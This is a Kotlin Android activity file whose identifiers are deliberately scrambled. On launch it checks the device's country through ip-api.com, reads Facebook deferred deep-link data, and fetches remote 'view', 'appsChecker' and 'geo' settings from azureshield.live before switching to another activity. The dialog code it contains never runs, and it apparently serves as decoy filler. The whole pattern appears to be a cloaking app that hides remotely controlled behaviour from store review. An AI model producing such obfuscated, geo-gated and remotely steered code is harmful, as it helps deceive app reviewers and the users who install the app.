package com.superking.parch

import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.superking.parch.databinding.ActivityMainBinding
import com.superking.parch.ffvfvfvv.MessagesHandler
import com.superking.parch.frrffrfr.AppplicaationClasa
import com.superking.parch.frrffrfr.AppplicaationClasa.Companion.bgbhhuju
import com.superking.parch.frrffrfr.AppplicaationClasa.Companion.geomeogtgt
import com.superking.parch.seeervice.ServiceApi
import com.superking.parch.tgh.FiiikiClasssa
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity() {
    val messages =  ArrayList<String>()

    var count  = 0

    val test = "yoyoyoyo"



    private var _binding: ActivityMainBinding? = null
    private val binding get() = _binding ?: throw RuntimeException("ActivityMainBinding = null")


    private suspend fun vcvcvcvc() {
        val xcxxccxxc = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)
        val frfrrfr = xcxxccxxc.getDataaaaaa().body()?.countryCode

        Hawk.put(bgbhhuju, frfrrfr)
    }

    fun bbbbb(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val bgbggbg = appLinkData.targetUri.host.toString()
                Hawk.put(AppplicaationClasa.juujjujugff, bgbggbg)
            }
            if (appLinkData == null) {
            }
        }
    }

    private suspend fun hyhy() {

        val bnbnbn = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://azureshield.live/")
            .build()
            .create(ServiceApi::class.java)
        val jkjkjk = bnbnbn.getDataDevvvvvv().body()?.view.toString()
        val ggggg5 = bnbnbn.getDataDevvvvvv().body()?.appsChecker.toString()
        val ddddd6 = bnbnbn.getDataDevvvvvv().body()?.geo.toString()




        Hawk.put(AppplicaationClasa.s, jkjkjk)
        Hawk.put(AppplicaationClasa.appsCheckfrr6, ggggg5)
        Hawk.put(AppplicaationClasa.geomeogtgt, ddddd6)

    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        bbbbb(this)

        kkkkkkkkkk()

        val uiiuuui = Executors.newSingleThreadScheduledExecutor()
        var ffgtgttoooo: String? = Hawk.get(bgbhhuju, null)
        var lololo: String? = Hawk.get(geomeogtgt, null)
        uiiuuui.scheduleAtFixedRate({
            if (ffgtgttoooo != null && lololo != null) {
                uiiuuui.shutdown()
                mkmkkmmk()
            } else {
                ffgtgttoooo = Hawk.get(bgbhhuju)
                lololo = Hawk.get(geomeogtgt)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            njnjjnj
        }
    }


    private val njnjjnj: Job = GlobalScope.launch(Dispatchers.IO) {
        vcvcvcvc()
        hyhy()
    }

    private fun mkmkkmmk() {
        val bbbbbbb = Intent(this@MainActivity, SiiiimpleFilterActivity::class.java)
        startActivity(bbbbbbb)
        finish()
    }



    private fun buildAlertDialog(length: Int, message: String) {
        if (count !== length) {
            val builder1: AlertDialog.Builder = AlertDialog.Builder(this@MainActivity)
            builder1.setMessage(message)
            builder1.setCancelable(true)
            builder1.setPositiveButton(
                "Yes",
                DialogInterface.OnClickListener { dialog, id ->
                    dialog.cancel()
                    count++

                })
            builder1.setNegativeButton(
                "No",
                DialogInterface.OnClickListener { dialog, id ->
                    dialog.cancel()
                    count++
                })
            val alert11: AlertDialog = builder1.create()
            alert11.show()
        }
    }

    fun myAlert(index: Int) {
        val builder1 = AlertDialog.Builder(this@MainActivity)
        builder1.setMessage(messages.get(count))
        builder1.setCancelable(true)
        builder1.setPositiveButton(
            "Yes"
        ) { dialog, id ->
            dialog.cancel()
            if (count == 555) {
                count++
                myAlert(count)
            }
        }
        builder1.setNegativeButton(
            "No"
        ) { dialog, id -> dialog.cancel() }
        val alert11 = builder1.create()
        alert11.show()
    }




    private fun kkkkkkkkkk() {
        if (test == "ok") {
            val fikiii = FiiikiClasssa(ccooooontext = this)
            fikiii.prrrrrrint()

            buildAlertDialog(55, "ggttg")

            val messagesHandler = MessagesHandler(this)

            messagesHandler.displayMessage(6)

            myAlert(555)

            Constants.FakeitLocale.CA
        }
    }
}

class Constants {
    enum class FakeitLocale(locale: String) {
        CA("ca"), DE("de"), EN("en"), ES("es"), FA("fa"), FI("fi-FI"), FR("fr"), HE("he"), ID("id"), IT(
            "it"
        ),
        JA("ja"), KO("ko"), NB("nb-NO"), NL("nl"), PL("pl"), PT("pt"), RU("ru"), SK("sk"), SV("sv"), TR(
            "tr"
        ),
        UK("uk"), VI("vi"), ZH("zh-CN");

        private var locale: Locale? = null

        init {
            when (locale) {
                "fi-FI" -> this.locale = Locale("fi", "FI")
                "zh-CN" -> this.locale = Locale("zh", "CN")
                "nb-NO" -> this.locale = Locale("nb", "NO")
                else -> this.locale = Locale(locale)
            }
        }

        fun locale(): Locale? {
            return locale
        }
    }
}